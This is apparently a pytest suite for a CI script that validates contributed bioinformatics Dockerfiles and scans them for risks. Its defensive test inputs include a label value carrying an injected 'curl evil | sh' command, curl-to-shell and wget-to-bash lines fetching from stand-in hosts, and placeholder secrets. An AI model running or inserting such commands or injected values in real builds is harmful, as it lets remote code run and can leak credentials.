"""Tests for the CI validation script. Run: python -m pytest .github/scripts/tests

Network-touching advisory checks are patched out so the suite runs offline.
"""
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import validate  # noqa: E402


# ---------------------------------------------------------------- detect

def test_detect_single_container(tmp_path):
    (tmp_path / "abyss" / "2.1.5-7-deb").mkdir(parents=True)
    (tmp_path / "abyss" / "2.1.5-7-deb" / "Dockerfile").write_text("FROM x\n")
    c, v, errors = validate.detect_container(
        ["abyss/2.1.5-7-deb/Dockerfile"], str(tmp_path))
    assert (c, v, errors) == ("abyss", "2.1.5-7-deb", [])


def test_detect_rejects_github_edits(tmp_path):
    _, _, errors = validate.detect_container(
        [".github/workflows/publish.yml"], str(tmp_path))
    assert errors and "GitHub CI files" in errors[0]


def test_detect_rejects_multiple_containers(tmp_path):
    _, _, errors = validate.detect_container(
        ["abyss/1/Dockerfile", "bwa/2/Dockerfile"], str(tmp_path))
    assert errors and "only modify one container" in errors[0]


def test_detect_requires_dockerfile(tmp_path):
    (tmp_path / "abyss" / "9").mkdir(parents=True)
    c, v, errors = validate.detect_container(["abyss/9/README.md"], str(tmp_path))
    assert (c, v) == ("abyss", "9")
    assert errors and "No Dockerfile" in errors[0]


def test_detect_rejects_top_level_file(tmp_path):
    _, _, errors = validate.detect_container(["README.md"], str(tmp_path))
    assert errors and "not inside a container directory" in errors[0]


def test_detect_rejects_unsafe_directory_names(tmp_path):
    _, _, errors = validate.detect_container(["abyss/$(evil)/Dockerfile"], str(tmp_path))
    assert errors and "[A-Za-z0-9._-]" in errors[0]


# ---------------------------------------------------------------- list

def test_list_multiple_containers(tmp_path):
    for name in ("abyss/1", "bwa/2"):
        d = tmp_path / name
        d.mkdir(parents=True)
        (d / "Dockerfile").write_text("FROM x\n")
    found = validate.list_containers(
        ["abyss/1/Dockerfile", "abyss/1/test-cmds.txt", "bwa/2/Dockerfile",
         ".github/workflows/x.yml", "README.md"], str(tmp_path))
    assert sorted(found) == ["abyss/1", "bwa/2"]


def test_list_skips_dirs_without_dockerfile(tmp_path):
    (tmp_path / "abyss" / "1").mkdir(parents=True)  # no Dockerfile
    found = validate.list_containers(["abyss/1/README.md"], str(tmp_path))
    assert found == []


# ---------------------------------------------------------------- check

def _no_network(monkeypatch):
    monkeypatch.setattr(validate, "_spdx_licenses", lambda: {"GPL-3.0": {}})
    monkeypatch.setattr(validate, "_http_status", lambda url: 404)


def _good_labels():
    return {
        "software": "abyss",
        "base_image": "biocontainers/biocontainers:vX_cv1",
        "software.version": "2.1.5-7-deb",
        "version": "1",
        "about.summary": "de novo, parallel, sequence assembler for short reads",
        "about.home": "http://example.org",
        "about.license": "GPL-3.0",
        "about.license_file": "/usr/share/doc/abyss/copyright",
    }


def test_check_valid_labels_compute_tag(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    df = tmp_path / "Dockerfile"
    df.write_text("FROM x\nRUN apt-get install abyss\n")
    ok, software, tag, errors, warnings = validate.check_labels(
        "abyss", "2.1.5-7-deb", _good_labels(), str(df))
    assert ok is True
    assert software == "abyss"
    assert tag == "2.1.5-7-deb_cv1"
    assert errors == []
    # version has no 'v' prefix -> advisory recommendation, but still valid
    assert any("conventional 'v'-prefixed" in w for w in warnings)


def test_check_v_prefixed_version_no_recommendation(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    df = tmp_path / "Dockerfile"
    df.write_text("FROM x\n")
    labels = _good_labels()
    labels["software.version"] = "v2.1.5-7-deb"
    ok, _, tag, errors, warnings = validate.check_labels(
        "abyss", "v2.1.5-7-deb", labels, str(df))
    assert ok is True
    assert tag == "v2.1.5-7-deb_cv1"
    assert not any("conventional 'v'-prefixed" in w for w in warnings)


def test_check_missing_required_label(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    df = tmp_path / "Dockerfile"
    df.write_text("FROM x\n")
    labels = _good_labels()
    del labels["about.home"]
    ok, _, _, errors, _ = validate.check_labels("abyss", "2.1.5-7-deb", labels, str(df))
    assert ok is False
    assert any("about.home" in e for e in errors)


def test_check_version_mismatch(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    df = tmp_path / "Dockerfile"
    df.write_text("FROM x\n")
    ok, _, _, errors, _ = validate.check_labels("abyss", "9.9.9", _good_labels(), str(df))
    assert ok is False
    assert any("does not match the directory version" in e for e in errors)


def test_check_forbidden_path_in_dockerfile(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    df = tmp_path / "Dockerfile"
    df.write_text("FROM x\nCOPY etc/biocontainers-ci/secret /root/\n")
    ok, _, _, errors, _ = validate.check_labels(
        "abyss", "2.1.5-7-deb", _good_labels(), str(df))
    assert ok is False
    assert any("Forbidden access" in e for e in errors)


def test_check_short_summary_fails(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    df = tmp_path / "Dockerfile"
    df.write_text("FROM x\n")
    labels = _good_labels()
    labels["about.summary"] = "too short"
    ok, _, _, errors, _ = validate.check_labels("abyss", "2.1.5-7-deb", labels, str(df))
    assert ok is False
    assert any("about.summary" in e for e in errors)


def test_check_rejects_shell_metacharacters_in_tag(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    df = tmp_path / "Dockerfile"
    df.write_text("FROM x\n")
    labels = _good_labels()
    labels["version"] = '1"; curl evil | sh; "'   # malicious LABEL version
    ok, _, tag, errors, _ = validate.check_labels("abyss", "2.1.5-7-deb", labels, str(df))
    assert ok is False
    assert any("not a valid Docker tag" in e for e in errors)


def test_check_tag_defaults_cv1_when_version_blank(tmp_path, monkeypatch):
    _no_network(monkeypatch)
    df = tmp_path / "Dockerfile"
    df.write_text("FROM x\n")
    labels = _good_labels()
    labels["version"] = ""
    ok, _, tag, errors, _ = validate.check_labels("abyss", "2.1.5-7-deb", labels, str(df))
    # version label blank is itself an error, but the tag still falls back to _cv1
    assert tag == "2.1.5-7-deb_cv1"
    assert ok is False


# ---------------------------------------------------------------- risk scan

def _scan(tmp_path, body):
    df = tmp_path / "Dockerfile"
    df.write_text(body)
    return validate.scan_dockerfile_risks(str(df))


def checklist_msgs(checklist):
    return [c["msg"] for c in checklist]


def test_scan_flags_curl_pipe_shell(tmp_path):
    # the phynest/#621 case
    secrets, checklist = _scan(
        tmp_path,
        "FROM biocontainers/biocontainers:v1.0.0_cv5\n"
        "RUN curl -fsSL https://install.julialang.org | sh -s -- -y\n")
    assert secrets == []
    assert any("remote script" in c for c in checklist_msgs(checklist))


def test_scan_flags_wget_pipe_bash(tmp_path):
    _, checklist = _scan(tmp_path, "FROM biocontainers/x\nRUN wget -qO- http://x | bash\n")
    msgs = checklist_msgs(checklist)
    assert any("remote script" in m for m in msgs)
    assert any("insecure `http://`" in m for m in msgs)


def test_scan_flags_add_url_and_bare_ip(tmp_path):
    _, checklist = _scan(tmp_path, "FROM biocontainers/x\nADD https://10.0.0.1/pkg.tar /tmp/\n")
    msgs = checklist_msgs(checklist)
    assert any("`ADD <url>`" in m for m in msgs)
    assert any("bare IP" in m for m in msgs)


def test_scan_flags_non_biocontainers_base(tmp_path):
    _, checklist = _scan(tmp_path, "FROM debian:stable-slim\nRUN echo hi\n")
    assert any("not an official `biocontainers/*`" in m for m in checklist_msgs(checklist))


def test_scan_accepts_quay_biocontainers_base(tmp_path):
    _, checklist = _scan(tmp_path, "FROM quay.io/biocontainers/samtools:1.19\nRUN echo hi\n")
    assert not any("not an official" in m for m in checklist_msgs(checklist))


def test_scan_flags_each_unapproved_stage_once(tmp_path):
    # every non-biocontainers stage is surfaced; a repeated base is flagged only once
    _, checklist = _scan(
        tmp_path,
        "FROM golang:1.22 AS build\nRUN go build\nFROM golang:1.22\nRUN x\n"
        "FROM alpine\nCOPY --from=build /x /x\n")
    base_flags = [m for m in checklist_msgs(checklist) if "not an official" in m]
    assert len(base_flags) == 2  # golang:1.22 (deduped) + alpine


def test_scan_ignores_comments(tmp_path):
    secrets, checklist = _scan(
        tmp_path,
        "FROM biocontainers/x\n# RUN curl http://evil | sh  (this is a comment)\nRUN echo ok\n")
    assert secrets == []
    assert checklist == []


def test_scan_blocks_aws_key(tmp_path):
    secrets, _ = _scan(
        tmp_path, "FROM biocontainers/x\nENV KEY=AKIAIOSFODNN7EXAMPLE\n")
    assert any("AWS access key" in s["msg"] for s in secrets)


def test_scan_blocks_private_key(tmp_path):
    secrets, _ = _scan(
        tmp_path, "FROM biocontainers/x\nRUN echo '-----BEGIN OPENSSH PRIVATE KEY-----'\n")
    assert any("private key" in s["msg"] for s in secrets)


def test_scan_credential_heuristic_does_not_echo_value(tmp_path):
    # advisory only, and the matched line must NOT be echoed (no snippet leak)
    secrets, checklist = _scan(
        tmp_path, "FROM biocontainers/x\nENV DB_PASSWORD=hunter2secret\n")
    assert secrets == []
    cred = [c for c in checklist if "embed a credential" in c["msg"]]
    assert cred and cred[0]["snippet"] == ""


def test_scan_http_in_label_is_not_a_download(tmp_path):
    # a homepage URL in a LABEL must NOT be flagged as an insecure download
    _, checklist = _scan(
        tmp_path,
        'FROM biocontainers/x\nLABEL about.home="http://example.org"\nRUN echo ok\n')
    assert not any("insecure `http://`" in m for m in checklist_msgs(checklist))


def test_scan_catches_split_curl_pipe_shell(tmp_path):
    # backslash continuation must not let `curl … | sh` evade the scan
    _, checklist = _scan(
        tmp_path,
        "FROM biocontainers/x\nRUN curl -fsSL https://x.sh \\\n    | sh\n")
    assert any("remote script" in m for m in checklist_msgs(checklist))


def test_scan_secret_line_snippet_not_echoed(tmp_path):
    # a line that trips BOTH a secret rule and curl|sh must be blocked AND must not
    # echo the token into the checklist snippet (Codex high finding)
    token = "ghp_" + "abcdefghijklmnopqrstuvwxyz0123456789"  # 36 chars after ghp_
    secrets, checklist = _scan(
        tmp_path,
        "FROM biocontainers/x\nRUN curl -H 'Authorization: %s' https://x | sh\n" % token)
    assert any("GitHub personal access token" in s["msg"] for s in secrets)
    remote = [c for c in checklist if "remote script" in c["msg"]]
    assert remote and remote[0]["snippet"] == ""       # no token leak


def test_scan_env_space_form_aws_secret_blocks(tmp_path):
    # `ENV KEY value` (no '=') is valid Dockerfile syntax and must not bypass the scan
    secrets, _ = _scan(
        tmp_path, "FROM biocontainers/x\nENV AWS_SECRET_ACCESS_KEY %s\n" % ("A" * 40))
    assert any("AWS secret access key" in s["msg"] for s in secrets)


def test_scan_env_space_form_password_advisory(tmp_path):
    _, checklist = _scan(
        tmp_path, "FROM biocontainers/x\nENV DB_PASSWORD hunter2secretvalue\n")
    assert any("embed a credential" in m for m in checklist_msgs(checklist))


def test_scan_catches_heredoc_curl_pipe_shell(tmp_path):
    _, checklist = _scan(
        tmp_path,
        "FROM biocontainers/x\nRUN <<EOF\ncurl -fsSL https://evil/install.sh | sh\nEOF\n")
    assert any("remote script" in m for m in checklist_msgs(checklist))


def test_scan_from_platform_flag_not_misparsed(tmp_path):
    _, checklist = _scan(
        tmp_path,
        "FROM --platform=linux/amd64 biocontainers/biocontainers:v1\nRUN echo ok\n")
    assert not any("not an official" in m for m in checklist_msgs(checklist))


def test_scan_flags_non_biocontainers_final_stage(tmp_path):
    _, checklist = _scan(
        tmp_path,
        "FROM biocontainers/biocontainers:v1 AS build\nRUN make\n"
        "FROM debian:stable-slim\nCOPY --from=build /x /x\n")
    flags = [m for m in checklist_msgs(checklist) if "not an official" in m]
    assert flags and any("debian" in m for m in flags)


def test_scan_from_stage_reference_not_flagged(tmp_path):
    _, checklist = _scan(
        tmp_path,
        "FROM biocontainers/biocontainers:v1 AS base\nRUN x\nFROM base\nRUN y\n")
    assert not any("not an official" in m for m in checklist_msgs(checklist))


def test_scan_clean_dockerfile_no_findings(tmp_path):
    secrets, checklist = _scan(
        tmp_path,
        "FROM biocontainers/biocontainers:v1.2.0_cv1\n"
        "RUN apt-get update && apt-get install -y samtools\n")
    assert secrets == []
    assert checklist == []


def test_cmd_detect_populates_review_checklist(tmp_path):
    (tmp_path / "tool" / "1").mkdir(parents=True)
    (tmp_path / "tool" / "1" / "Dockerfile").write_text(
        "FROM biocontainers/x\nRUN curl -fsSL https://x.sh | sh\n")
    out = tmp_path / "report.json"
    (tmp_path / "cf.txt").write_text("tool/1/Dockerfile\n")
    import argparse
    import json as _json
    args = argparse.Namespace(
        changed_files=str(tmp_path / "cf.txt"), workdir=str(tmp_path), out=str(out))
    rc = validate.cmd_detect(args)
    report = _json.loads(out.read_text())
    assert rc == 0
    assert report["ok"] is True  # advisory, does not fail the build
    assert any("remote script" in c for c in report["review_checklist"])
